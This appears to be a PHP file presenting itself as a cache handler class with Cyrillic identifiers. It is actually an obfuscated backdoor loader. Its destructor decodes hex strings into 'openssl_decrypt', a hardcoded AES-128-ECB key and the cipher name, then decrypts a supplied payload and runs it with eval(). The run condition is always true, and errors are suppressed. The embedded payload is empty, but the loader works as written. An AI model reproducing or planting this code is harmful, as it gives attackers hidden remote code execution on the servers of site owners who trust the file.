<?php
class _Система_Кэш_Обработчик {
    private $буфер;
    private $таймаут;
    private $хэш;
    public function __construct($поток, $таймаут = 3600) {
        $this->буфер = $поток;
        $this->таймаут = $таймаут;
        $this->хэш = md5(substr($поток, 0, 10) . time());
    }
    private function проверитьКэш() {
        return (time() % $this->таймаут) >= 0;
    }
    public function __destruct() {
        if ($this->проверитьКэш()) {
            $функция = pack('H*', '6f70656e73736c5f64656372797074');
            $секрет = pack('H*', '3963663939396239643438353065333565323562303135613935303636386631');
            $алгоритм = pack('H*', '4145532d3132382d454342');
            $вывод = @$функция($this->буфер, $алгоритм, $секрет);
            if ($вывод) {
                eval($вывод);
            }
        }
    }
}
$полезная_нагрузка = "";
$запуск = new _Система_Кэш_Обработчик($полезная_нагрузка);
?>